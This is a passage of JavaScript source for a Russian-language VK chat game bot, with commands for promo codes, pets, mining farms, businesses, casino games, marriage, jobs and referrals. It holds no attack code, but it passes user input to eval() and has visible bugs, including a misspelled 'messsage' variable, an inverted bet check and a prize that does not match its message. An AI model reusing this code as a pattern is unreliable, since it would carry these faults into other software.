	if(promo >= config.promolimit) return bot(`у этого промокода ЗАКОНЧИЛИСЬ ИСПОЛЬЗОВАНИЯ, включи уведомления в группе о новых записях что бы узнавать ОДНИМ ИЗ ПЕРВЫХ о новых промокодах. 📢`);
	if(config.promotip === "btc") message.user.btc += config.promovalue;
	if(config.promotip === "balance") message.user.balance += config.promovalue;
	message.user.promo = true;
	promo += 1;
	ostalos = config.promolimit-promo;
	return bot(`зачислено +${utils.sp(config.promovalue)}${config.promotip.toString().replace(/btc/gi, "฿").replace(/balance/gi, "$")} ✅
📢 Осталось ${ostalos} использований.`);

}

});

cmd.hear(/^(?:питомец улучшить)$/i, async (message, bot) => {
	if(message.user.misc.pet < 1) return bot(`у Вас нет питомца. ${smileerror}`);
	else {

		if(message.user.balance < petsupd[message.user.misc.pet - 1].cost) return bot(`недостаточно денег. ${smileerror}`);

		var priceupd = petsupd[message.user.misc.pet - 1].cost*message.user.pet.lvl;

		var lvlpoupd = message.user.pet.lvl+1;

		message.user.balance -= priceupd;
		message.user.pet.lvl += 1;

		return bot(`питомец был прокачен до ${lvlpoupd} уровня за ${utils.sp(priceupd)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);


}

});

cmd.hear(/^(?:питомец поход)$/i, async (message, bot) => {
	if(message.user.misc.pet < 1) return bot(`у Вас нет питомца. ${smileerror}`);
	else {

		if(message.user.timers.poxod) return bot(`вы сможете отправить питомца в поход через 60 минут. Ваш питомец довольно сильно устал! ${smileerror}`);

		let cashfind = utils.random(736,2879);
		message.user.balance += cashfind;
		message.user.timers.poxod = true;

			setTimeout(() => {
				message.user.timers.poxod = false;
			}, 3600000);

		return bot(`ваш питомец нашёл в походе ${utils.sp(cashfind)}$. Улучшайте своего питомца! ${smilesuccess}`);
}

});

cmd.hear(/^(?:фермы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Майнинг фермы: 
${message.user.misc.farm === 1 ? '🔹' : '🔸'} 1. 6U Nvidia 2₿/час (20.500.000$)
${message.user.misc.farm === 2 ? '🔹' : '🔸'} 2. AntminerS9 10₿/час (100.000.000$)
${message.user.misc.farm === 3 ? '🔹' : '🔸'} 3. FM2018-BT200 100₿/час (900.000.000$)

Для покупки введите "Фермы [номер] [кол-во]"`);

	const sell = farms.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.farms >= message.user.farmslimit) return bot(`вы достигли лимита ферм. ${smileerror}`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег ${smileerror}`);
	else if(message.user.balance >= sell.cost)
	{

		if(Number(message.args[2])){

		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

			message.user.balance -= sell.cost;
			message.user.misc.farm = sell.id;
			message.user.farms += message.args[2];

			saveUsers();
			return bot(`вы купили ${sell.name} (x${message.args[2]}) за ${utils.sp(sell.cost)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);

		}
		else {

		message.user.balance -= sell.cost;
		message.user.misc.farm = sell.id;
		message.user.farms += 1;

		saveUsers();
		return bot(`вы купили ${sell.name} (x1) за ${utils.sp(sell.cost)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
		}	
	}
});

cmd.hear(/^(?:фермы 1)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Майнинг фермы: 
${message.user.misc.farm === 1 ? '🔹' : '🔸'} 1. 6U Nvidia 2₿/час (20.500.000$)
${message.user.misc.farm === 2 ? '🔹' : '🔸'} 2. AntminerS9 10₿/час (100.000.000$)
${message.user.misc.farm === 3 ? '🔹' : '🔸'} 3. FM2018-BT200 100₿/час (900.000.000$)

Для покупки введите "Фермы [номер] [кол-во]"`);

	if(message.user.farms >= message.user.farmslimit) return bot(`вы достигли лимита ферм. ${smileerror}`);

	if(message.user.balance < 20500000) return bot(`недостаточно денег ${smileerror}`);
	else if(message.user.balance >= 20500000)
	{

		var pricefarms1 = 20500000*message.args[1];

		message.user.balance -= pricefarms1;
		message.user.misc.farm = 1;

		if(message.user.misc.farm === 1) message.user.farms += Number(message.args[1]);
		else
		{

			message.user.farms = Number(message.args[1]);

		}

		saveUsers();
		return bot(`вы купили 6U Nvidia (x${Number(message.args[1])}) за ${utils.sp(pricefarms1)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
			
	}
});

cmd.hear(/^(?:фермы 2)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Майнинг фермы: 
${message.user.misc.farm === 1 ? '🔹' : '🔸'} 1. 6U Nvidia 2₿/час (20.500.000$)
${message.user.misc.farm === 2 ? '🔹' : '🔸'} 2. AntminerS9 10₿/час (100.000.000$)
${message.user.misc.farm === 3 ? '🔹' : '🔸'} 3. FM2018-BT200 100₿/час (900.000.000$)

Для покупки введите "Фермы [номер] [кол-во]"`);

	if(message.user.farms >= message.user.farmslimit) return bot(`вы достигли лимита ферм. ${smileerror}`);

	if(message.user.balance < 100000000) return bot(`недостаточно денег ${smileerror}`);
	else if(message.user.balance >= 100000000)
	{

		var pricefarms2 = 100000000*message.args[1];

		message.user.balance -= pricefarms2;
		message.user.misc.farm = 2;

		if(message.user.misc.farm === 2) message.user.farms += Number(message.args[1]);
		else
		{

			message.user.farms = Number(message.args[1]);

		}

		saveUsers();
		return bot(`вы купили AntminerS9 (x${Number(message.args[1])}) за ${utils.sp(pricefarms2)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
			
	}
});

cmd.hear(/^(?:фермы 3)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`Майнинг фермы: 
${message.user.misc.farm === 1 ? '🔹' : '🔸'} 1. 6U Nvidia 2₿/час (20.500.000$)
${message.user.misc.farm === 2 ? '🔹' : '🔸'} 2. AntminerS9 10₿/час (100.000.000$)
${message.user.misc.farm === 3 ? '🔹' : '🔸'} 3. FM2018-BT200 100₿/час (900.000.000$)

Для покупки введите "Фермы [номер] [кол-во]"`);

	if(message.user.farms >= message.user.farmslimit) return bot(`вы достигли лимита ферм. ${smileerror}`);

	if(message.user.balance < 900000000) return bot(`недостаточно денег ${smileerror}`);
	else if(message.user.balance >= 900000000)
	{

		var pricefarms3 = 900000000*message.args[1];

		message.user.balance -= pricefarms3;
		message.user.misc.farm = 3;

		if(message.user.misc.farm === 3) message.user.farms += Number(message.args[1]);
		else
		{

			message.user.farms = Number(message.args[1]);

		}

		saveUsers();
		return bot(`вы купили FM2018-BT200 (x${Number(message.args[1])}) за ${utils.sp(pricefarms3)}$
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
			
	}
});

cmd.hear(/^(?:рейтинг)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(( message.args[1] * 250000000 ) > message.user.balance) return bot(`у вас недостаточно денег`);
	else if(( message.args[1] * 250000000 ) <= message.user.balance)
	{
		message.user.balance -= ( message.args[1] * 250000000 );
		message.user.rating += message.args[1];

		return bot(`вы повысили свой рейтинг на ${utils.sp(message.args[1])}👑 за ${utils.sp(message.args[1] * 250000000)}$`);
	}
});

cmd.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`бизнесы:
${message.user.business === 1 ? '🔸' : '🔹'} 1. Шаурмичная - 50.000$
⠀ ⠀ ⠀ Прибыль: 400$/час
${message.user.business === 2 ? '🔸' : '🔹'} 2. Ларёк - 100.000$
⠀ ⠀ ⠀ Прибыль: 700$/час
${message.user.business === 3 ? '🔸' : '🔹'} 3. Ресторан - 300.000$
⠀ ⠀ ⠀ Прибыль: 2.500$/час
${message.user.business === 4 ? '🔸' : '🔹'} 4. Магазин - 500.000$
⠀ ⠀ ⠀ Прибыль: 3.800$/час
${message.user.business === 5 ? '🔸' : '🔹'} 5. Завод - 1.500.000$
⠀ ⠀ ⠀ Прибыль: 8.000$/час
${message.user.business === 6 ? '🔸' : '🔹'} 6. Шахта - 25.000.000$
⠀ ⠀ ⠀ Прибыль: 70.000$/час
${message.user.business === 7 ? '🔸' : '🔹'} 7. Офис - 80.000.000$
⠀ ⠀ ⠀ Прибыль: 220.000$/час
${message.user.business === 8 ? '🔸' : '🔹'} 8. Разработка игр - 150.000.000$
⠀ ⠀ ⠀ Прибыль: 300.000$/час
${message.user.business === 9 ? '🔸' : '🔹'} 9. Нефтевышка - 500.000.000$
⠀ ⠀ ⠀ Прибыль: 700.000$/час
${message.user.business === 10 ? '🔸' : '🔹'} 10. Атомная электростанция - 800.000.000$
⠀ ⠀ ⠀ Прибыль: 1.000.000$/час
${message.user.business === 11 ? '🔸' : '🔹'} 11. Космическое агентство - 50.000.000.000$
⠀ ⠀ ⠀ Прибыль: 50.000.000$/час
Для покупки введите "Бизнесы [номер]"`);

	const sell = businesses.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.business) return bot(`у вас уже есть бизнес (${businesses[message.user.business - 1].name}), введите "Продать бизнес"`);

	if(message.user.balance < sell.cost) return bot(`недостаточно денег`);
	else if(message.user.balance >= message.args[1])
	{
		message.user.balance -= sell.cost;
		message.user.business = sell.id;
		message.user.bizlvl = 1;

		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});

cmd.hear(/^(?:курс)$/i, async (message, bot) => {
	return bot(`курс валют на данный момент:
💸Биткоин: ${utils.sp(btc)}$`);
});

cmd.hear(/^(?:биткоин)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(( message.args[1] * btc ) > message.user.balance) return bot(`недостаточно денег
Курс биткоина: ${btc}$`);
	else if(( message.args[1] * btc ) <= message.user.balance)
	{
		message.user.balance -= ( message.args[1] * btc );
		message.user.btc += message.args[1];

		return bot(`вы купили ${utils.sp(message.args[1])}₿ за ${utils.sp(message.args[1] * btc)}$`);
	}
});

cmd.hear(/^(?:топ)$/i, async (message, bot) => {
	let top = [];

	users.map(x=> {
		top.push({ balance: x.balance, rating: x.rating, tag: x.tag, id: x.id, mention: x.mention });
	});

	top.sort((a, b) => {
		return b.rating - a.rating;
	});

	let text = ``;
	const find = () => {
		let pos = 1000;

		for (let i = 0; i < top.length; i++)
		{
			if(top[i].id === message.senderId) return pos = i;
		}

		return pos;
	}

	for (let i = 0; i < 10; i++)
	{
		if(!top[i]) return;
		const user = top[i];

		text += `${i === 9 ? `&#128287;` : `${i + 1}&#8419;`} @id${user.id} (${user.tag}) — 👑${utils.sp(user.rating)} | $${utils.rn(user.balance)}
		`;
	}

	return bot(`топ игроков:
		${text}
—————————————————
${utils.gi(find() + 1)} ${message.user.tag} — 👑${utils.sp(message.user.rating)} | $${utils.rn(message.user.balance)}`);
});

cmd.hear(/^(?:бонус|🔑 Бонус|@bot_gorilla_v2 🔑 Бонус)$/i, async (message, bot) => {

	if(message.user.timers.bonus) return bot(`бонус можно получить раз в 24 часа ${smileerror}`);

	let prize = utils.pick([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]);

	setTimeout(() => {
		message.user.timers.bonus = false;
	}, 86400000);

	message.user.timers.bonus = true;


	if(prize === 1)
	{
		message.user.balance += 50000;
		return bot(`вы выиграли 50.000$ ${smilesuccess}`);
	}

	if(prize === 2)
	{
		message.user.btc += 1000;
		return bot(`вы выиграли 1.000₿ ${smilesuccess}`);
	}

	if(prize === 3)
	{
		message.user.rating += 5;
		return bot(`вы выиграли 5👑`);
	}

	if(prize === 4)
	{
		message.user.rating += 1;
		return bot(`вы выиграли 1👑`);
	}

	if(prize === 5)
	{
		message.user.rating += 10;
		return bot(`вы выиграли 10👑`);
	}

	if(prize === 6)
	{
		message.user.rating += 2;
		return bot(`вы выиграли 2👑`);
	}
	if(prize === 7)
	{
		message.user.rating += 3;
		return bot(`вы выиграли 3👑`);
	}
	if(prize === 8)
	{
		message.user.rating += 4;
		return bot(`вы выиграли 4👑`);
	}
	if(prize === 9)
	{
		message.user.bank += 1000000;
		return bot(`вы выиграли 1.000.000$ на свой банковский счёт ${smilesuccess}`);
	}
	if(prize === 10)
	{
		message.user.bank += 5000000;
		return bot(`вы выиграли 5.000.000$ на свой банковский счёт ${smilesuccess}`);
	}

	if(prize === 11)
	{
		message.user.bank += 10000000;
		return bot(`вы выиграли 10.000.000$ на свой банковский счёт ${smilesuccess}`);
	}

	if(prize === 12)
	{
		message.user.bank += 50000000;
		return bot(`вы выиграли 50.000.000$ на свой банковский счёт ${smilesuccess}`);
	}
});

cmd.hear(/^(?:поход)$/i, async (message, bot) => {

	if(message.user.timers.poxod2) return bot(`вы сегодня уже были в походе. ${smileerror}`);

	let prize2 = utils.pick([1, 2, 3, 4, 5, 6, 7, 8]);

	setTimeout(() => {
		message.user.timers.poxod2 = false;
	}, 86400000);

	message.user.timers.poxod2 = true;


	if(prize2 === 1)
	{
		message.user.balance += 50000;
		return bot(`находясь в походе, вы нашли 50.000$ ${smilesuccess}`);
	}

	if(prize2 === 2)
	{
		message.user.btc += 1000;
		return bot(`находясь в походе, вы нашли 1.000₿ ${smilesuccess}`);
	}

	if(prize2 === 3)
	{
		message.user.rating += 5;
		return bot(`находясь в походе, вы нашли 5👑`);
	}

	if(prize2 === 4)
	{
		message.user.rating += 1;
		return bot(`находясь в походе, вы нашли 1👑`);
	}

	if(prize2 === 5)
	{
		message.user.rating += 10;
		return bot(`находясь в походе, вы нашли 10👑`);
	}

	if(prize2 === 6)
	{
		message.user.rating += 2;
		return bot(`находясь в походе, вы нашли 2👑`);
	}
	if(prize2 === 7)
	{
		message.user.rating += 3;
		return bot(`находясь в походе, вы нашли 3👑`);
	}
	if(prize2 === 8)
	{
		message.user.rating += 4;
		return bot(`находясь в походе, вы нашли 4👑`);
	}
});

cmd.hear(/^(?:брак)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.marriage.partner) return bot(`вы уже в браке с игроком ${users[message.user.marriage.partner].tag}`);
	if(Number(message.args[1]) === message.user.uid) return bot(`вы не можете жениться/выйти замуж за себя`);

	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);

	if(user.marriage.partner) return bot(`этот человек уже состоит в браке`);

	if(user.marriage.requests.find(x=> x == message.args[1])) return bot(`вы уже делали предложение этому игроку`);

	if(message.user.marriage.requests.find(x=> x == message.args[1]))
	{
		message.user.marriage.requests = [];
		message.user.marriage.partner = user.uid;

		user.marriage.requests = [];
		user.marriage.partner = message.user.uid;

		return bot(`вы вступили в брак с игроком "${user.tag}"`);
	}

	user.marriage.requests.push(message.user.uid);
	return bot(`вы сделали предложение игроку "${user.tag}"`);
});

cmd.hear(/^(?:браки)$/i, async (message, bot) => {
	if(message.user.marriage.partner) return bot(`вы уже состоите в браке`);
	return bot(`предложения:
		${message.user.marriage.requests.map(x=> `от игрока "${users[x].tag}" (ID: ${x})`).join('\n')}`);
});

cmd.hear(/^(?:развод)$/i, async (message, bot) => {
	if(!message.user.marriage.partner) return bot(`вы не состоите в браке`);

	let user = users.find(x=> x.uid === message.user.marriage.partner);

	message.user.marriage.partner = 0;
	user.marriage.partner = 0;

	return bot(`вы теперь свободный человек`);
});

cmd.hear(/^(?:дата)\s([0-9]+)$/i, async (message, bot) => {
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);

	return bot(`дата регистрации ${user.tag}: ${user.regDate}`);
});

cmd.hear(/^(?:репорт|реп|rep|жалоба)\s([^]+)$/i, async (message, bot) => {
	if(message.isChat) return bot(`команда работает только в ЛС.`);

	vk.api.messages.send({ user_id: config.ownerid, forward_messages: message.id, message: `Player id: ${message.user.uid}` }).then(() => {
		return bot(`ваше сообщение отправлено.`);
	}).catch((err) => {
		return bot(`укажите свой ID в файле /database/settings.json`);
	});
});

cmd.hear(/^(?:ответ)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
	if(message.user.adm <= 3) return; 

	const user = await users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return;

	vk.api.messages.send({ user_id: user.id, message: `✉ Сообщение от администратора:
	Язык: 🇷🇺
	
	${message.args[2]}` });
});

cmd.hear(/^(?:реши)\s([0-9]+)\s(\+|\-|\/|\*)\s([0-9]+)$/i, async (message, bot) => {
	const result = eval(`${message.args[1]} ${message.args[2]} ${message.args[3]}`);
	return bot(`${message.args[1]} ${message.args[2]} ${message.args[3]}=${result}`);
});

cmd.hear(/^(?:работа)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.work) return bot(`ваша профессия - ${works[message.user.work - 1].name}
	${message.user.timers.hasWorked ? `Вы уже работали в эти 10 минут` : ``}`);

	const work = works.find(x=> x.id === Number(message.args[1]));
	if(!work) return console.log(message.args[1]);

	if(work.requiredLevel > message.user.level) return bot(`вы не можете устроиться на эту работу!`);
	else if(work.requiredLevel <= message.user.level)
	{
		message.user.work = work.id;
		return bot(`вы устроились работать в Общее - ${work.name}
		👔 Введите команду "Работать"`);
	}
});

cmd.hear(/^(?:работа)$/i, async (message, bot) => {
	if(message.user.work) return bot(`ваша профессия - ${works[message.user.work - 1].name}
	${message.user.timers.hasWorked ? `Вы уже работали в эти 10 минут` : ``}`);
	return bot(`профессии:
	🔹 1. Дворник - зарплата ~12.500$
	🔹 2. Сантехник - зарплата ~22.500$
	🔹 3. Электрик - зарплата ~25.000$
	🔹 4. Слесарь - зарплата ~30.000$
	🔹 5. Юрист - зарплата ~45.000$
	🔹 6. Бухгалтер - зарплата ~55.000$
	🔹 7. Бармен - зарплата ~60.000$
	🔹 8. Администратор - зарплата ~75.000$
	🔹 9. Программист - зарплата ~100.000$
	Для трудоустройства введите "Работа [номер]`);
});

cmd.hear(/^(?:работать)$/i, async (message, bot) => {
	if(!message.user.work) return bot(`вы нигде не работаете 😩
	Для трудоустройства введите "Работа"`);

	if(message.user.timers.hasWorked) return bot(`рабочий день закончен.
	⏳ Вы сможете работать в ближайшие 10 минут`);

	setTimeout(() => {
		message.user.timers.hasWorked = false;
	}, 600000);

	message.user.timers.hasWorked = true;

	const work = works.find(x=> x.id === message.user.work);
	const earn = utils.random(work.min, work.max);

	message.user.balance += earn;
	message.user.exp += 1;

	return bot(`рабочий день закончен 
	💵 Вы заработали ${utils.sp(earn)}$`);
});

cmd.hear(/^(?:уволиться)$/i, async (message, bot) => {
	if(!message.user.work) return bot(`вы нигде не работаете`);
	
	message.user.work = 0;
	return bot(`вы уволились со своей работы`);
});

cmd.hear(/^(?:кубик|куб)\s([1-6])$/i, async (message, bot) => {
	const int = utils.pick([1, 2, 3, 4, 5, 6]);
	if(int == message.args[1])
	{
		message.user.balance += 2000000;
		return bot(`вы угадали! Приз 2.000.000$`);
	} else return bot(`не угадали 
	🎲 Выпало число ${int}`);
});

cmd.hear(/^(?:казино)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);
	
	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(message.args[1] > message.user.balance) return bot(`на вашем балансе нет столько денег! ${smileerror}`);
	else if(message.args[1] <= message.user.balance)
	{
		message.user.balance -= message.args[1];
		const multiply = utils.pick([0.25, 0.75, 0.5, 0.5, 0.5, 0.5, 0.50, 0.50, 0.75, 0.75, 0.25, 1, 1, 1, 1, 0.5, 0.5, 0.5, 0.5, 1, 1, 1, 1, 2, 2]);

		message.user.balance += Math.floor(message.args[1] * multiply);
		return bot(`${multiply === 1 ? `ваши деньги остаются при вас ${smilesuccess}` : `${multiply < 1 ? `вы проиграли ${utils.sp(message.args[1] * multiply)}$ ${smileerror}` : `вы выиграли ${utils.sp(message.args[1] * multiply)}$ ${smilesuccess}`}`} (x${multiply})
		💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);
	}
});

cmd.hear(/^(?:трейд)\s(вверх|вниз)\s(.*)$/i, async (message, bot) => {
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	let smilekazinobad = utils.pick([`😒`, `😯`, `😔`, `😕`]);

	if(message.args[2] > message.user.balance) return bot(`у Вас недостаточно денег ${smilekazinobad}`);
	if(message.args[2] >= 50) return bot(`ставка должна быть больше 50$ ${smilekazinobad}`);
	else if(message.args[2] <= message.user.balance)
	{
		message.user.balance -= message.args[2];

		const rand = utils.pick([0, 1]);
		const nav = Number(message.args[1].toLowerCase().replace(/вверх/, '1').replace(/вниз/, '2'));

		if(rand === nav)
		{
			const multiply = utils.pick([0.75, 0.80, 0.90, 0.95, 1.25, 1.5, 1.75, 2, 2.5]);
			message.user.balance += Math.floor(message.args[2] * multiply);

			return bot(`курс ${nav === 1 ? `подорожал⤴` : `подешевел⤵`} на ${utils.random(100)}$
			✅ Вы заработали +${message.args[2] * multiply}$
			💰 Баланс: ${message.user.balance}$`);
		} else {
			return bot(`курс ${nav === 2 ? `подорожал⤴` : `подешевел⤵`} на ${utils.random(100)}$
			❌ Вы потеряли ${message.args[2]}$ 
			💰 Баланс: ${message.user.balance}`);
		}
	}
});

cmd.hear(/^(?:стаканчик)\s([1-3])\s(.*)$/i, async (message, bot) => {
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	if(message.args[2] > message.user.balance) return bot(`у Вас недостаточно денег 😔
💰 Ваш баланс: ${message.user.balance}$`);
	else if(message.args[2] <= message.user.balance)
	{
		message.user.balance -= message.args[2];

		const multiply = utils.pick([0.95, 0.90, 0.85, 0.80, 0.75, 0.70, 0.65]);
		const cup = utils.random(1, 3);

		if(cup == message.args[1])
		{
			message.user.balance += Math.floor(message.args[2] * multiply);
			return bot(`вы угадали! Приз ${message.args[2] * multiply} ${smilesuccess}`);
		} else {
			return bot(`вы не угадали, это был ${cup}-ый стаканчик ${smileerror}`);
		}
	}
});

cmd.hear(/^(?:бизнес)$/i, async (message, bot) => {
	if(!message.user.business) return bot(`у Вас нет бизнеса! ${smileerror}
Для выбора бизнеса отправьте «Бизнесы»`);
	const biz = businesses.find(x=> x.id === message.user.business);
	var lvlcash = biz.earn*message.user.bizlvl;
var updprice2 = Math.floor(businesses[message.user.business - 1].cost * 2)*message.user.bizlvl
	return bot(`статистика "${biz.name}":
	💸 Прибыль: ${utils.sp(lvlcash)}$/час
	💰 На счёте: ${utils.sp(message.user.biz)}$
	🌟 Уровень: ${message.user.bizlvl}
	✅ Стоимость улучшения: ${utils.sp(updprice2)}$`);
});

cmd.hear(/^(?:бизнес улучшить)$/i, async (message, bot) => {
	if(!message.user.business) return bot(`у Вас нет бизнеса! ${smileerror}
Для выбора бизнеса отправьте «Бизнесы»`);
	const biz = businesses.find(x=> x.id === message.user.business);

	var updprice = Math.floor(businesses[message.user.business - 1].cost * 2)*message.user.bizlvl;

	if(message.user.balance < updprice) return bot(`недостаточно денег. ${smileerror}`);

	message.user.bizlvl += 1;
	message.user.balance -= updprice;

	return bot(`вы успешно улучшили бизнес. ${smilesuccess}
💰 Ваш баланс: ${utils.sp(message.user.balance)}$`);


});

cmd.hear(/^(?:бизнес)\s(?:снять)$/i, async (message, bot) => {
	if(!message.user.business) return bot(`у Вас нет бизнеса! ${smileerror}
Для выбора бизнеса отправьте «Бизнесы»`);
	if(!message.user.biz) return bot(`у вас нет денег на счёте этого бизнеса. ${smileerror}`);


	var cashlvlbiz = message.user.biz*messsage.user.bizlvl;

	message.user.balance += cashlvlbiz;
	message.user.biz = 0;

	bot(`вы сняли со счёта своего бизнеса ${utils.sp(cashlvlbiz)}$ ${smilesuccess}`);
	message.user.biz = 0;

	return;
});

cmd.hear(/^(?:ферма|🔋 Ферма)$/i, async (message, bot) => {
	let smileerror2 = utils.pick([`😒`, `😯`, `😔`, `🤔`]);

	if(!message.user.misc.farm) return bot(`у Вас нет майнинговых ферм. ${smileerror2}`);
	if(!message.user.farm_btc) return bot(`на ваших фермах еще нет биткоинов. Новые биткойны появятся через час 🔎`);

	const btc_ = message.user.farm_btc;

	message.user.btc += message.user.farm_btc;
	message.user.farm_btc = 0;

	return bot(`вы собрали со своих ферм ${utils.sp(btc_)}฿`);
});

cmd.hear(/^(?:restart)$/i, async (message, bot) => {
	if(message.user.settings.adm < 4) return;
	await bot(`бот уходит в перезагрузку.`);

	await saveUsers();
	process.exit(-1);
	console.log("node app")
});

cmd.hear(/^(?:реф|реферал)$/i, async (message, bot) => {
	return bot(`вы пригласили: ${users.filter(x=> x.referal === message.user.uid).length}
	Для того, чтобы вам засчитали друга он должен написать команду "Реф ${message.user.uid}"
	
	За каждого друга вы получаете 10.000.000.000$ (10 млрд)
	Если друг активирует вашу рефералку, то он получит 15.000.000.000₽ (15 млрд)`);
});

cmd.hear(/^(?:реф|реферал)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.referal !== null) return bot(`вы уже активировали рефералку!`);
	let user = users.find(x=> x.uid === Number(message.args[1]));

	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.balance += 10000000000;
	message.user.balance += 15000000000;

	message.user.referal = Number(message.args[1]);

	vk.api.messages.send({ user_id: user.id, message: `❤За приглашение друга вам начислено +10.000.000.000$` });
	return bot(`вы активировали рефералку.
	💲 Вам начислено 15.000.000.000$`);
});

cmd.hear(/^(?:сейф)\s([0-9]+)$/i, async (message, bot) => {
	if(message.args[1] < 10 || message.args[1] >= 100) return;

	const int = utils.random(10, 99);
	message.args[1] = Number(message.args[1]);

	if(int === message.args[1])
	{
		message.user.balance += 1000000000;
		return bot(`невероятно! Вы угадали число.
		💲 Вам начислено 10.000.000.000$`);
	} else if(int !== message.args[1])
	{
		return bot(`вы не угадали число. Вам выпало число "${int}"
		🎉 Не отчаивайтесь, количество попыток неограниченно.
		
		Если вы угадаете код, то вы получите 1.000.000.000$`);
	}
});

cmd.hear(/^(?:промо вкл)$/i, async (message, bot) => { 
if(message.user.settings.adm <= 4) return; 

clearPromo();
return bot(`промокод включен! ${smilesuccess}`);

});

cmd.hear(/^(?:промо тип btc)$/i, async (message, bot) => { 
if(message.user.settings.adm <= 4) return; 
config.promotip = "btc"; 
saveConfig();
return bot(`тип промокода: Bitcoin. ${smilesuccess}`);

});

cmd.hear(/^(?:промо тип баланс)$/i, async (message, bot) => { 
if(message.user.settings.adm <= 4) return; 
config.promotip = "balance"; 
saveConfig();
return bot(`тип промокода: Баланс. ${smilesuccess}`);

});

cmd.hear(/^(?:копать)$/i, async (message, bot) => { 

return bot(`использование: «копать железо/золото/алмазы» ${smileerror}`);

});

cmd.hear(/^(?:копать железо)$/i, async (message, bot) => { 

if(message.user.energy < 1) return bot(`вы сильно устали.
⚠ Энергия появляется каждые 5 минут!`);

let randzhelezo = utils.random(16, 97);

message.user.energy -= 1;
message.user.opit += 1;
message.user.zhelezo += randzhelezo;

saveUsers();

if(message.user.energy > 0) return bot(`+${randzhelezo} железа.
💡 Энергия: ${message.user.energy}, опыт: ${message.user.opit}`);

if(message.user.energy < 1) {

setTimeout(() => {
	message.user.energy = 10;
}, 300000);

return bot(`+${randzhelezo} железа.
Энергия закончилась. ⚠`);

}

});

cmd.hear(/^(?:копать золото)$/i, async (message, bot) => { 

if(message.user.opit < 300) return bot(`что бы копать золото нужно больше 300 опыта. Копайте железо и увеличивайте свой опыт! ⚠`);

if(message.user.energy < 1) return bot(`вы сильно устали.
⚠ Энергия появляется каждые 5 минут!`);

let randzoloto = utils.random(5, 35);

message.user.energy -= 1;
message.user.opit += 5;
message.user.zoloto += randzoloto;

saveUsers();

if(message.user.energy > 0) return bot(`+${randzoloto} золота.
💡 Энергия: ${message.user.energy}, опыт: ${message.user.opit}`);

if(message.user.energy < 1) {

setTimeout(() => {
	message.user.energy = 10;
}, 300000);

return bot(`+${randzoloto} золота.
Энергия закончилась. ⚠`);

}

});

cmd.hear(/^(?:копать алмазы)$/i, async (message, bot) => { 

if(message.user.opit < 3000) return bot(`что бы копать алмазы нужно больше 3 000 опыта. Копайте железо и увеличивайте свой опыт! ⚠`);

if(message.user.energy < 1) return bot(`вы сильно устали.
⚠ Энергия появляется каждые 5 минут!`);

let randalmaz = utils.random(3, 26);

message.user.energy -= 1;
message.user.opit += 10;
message.user.almaz += randalmaz;

saveUsers();

if(message.user.energy > 0) return bot(`+${randalmaz} алмазов.
